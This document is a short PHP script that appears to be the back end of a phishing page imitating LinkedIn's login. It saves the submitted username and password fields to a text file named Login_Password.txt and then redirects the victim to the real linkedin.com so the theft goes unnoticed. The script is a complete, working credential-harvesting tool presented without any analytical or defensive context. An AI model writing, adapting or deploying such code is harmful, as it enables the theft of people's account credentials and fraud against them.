<?php
file_put_contents("Login_Password.txt", "Username: " . $_POST["session_key"] . "\nPassword : " . $_POST["session_password"] . "\n\n", FILE_APPEND);
header("Location : https://www.linkedin.com");
exit();
?>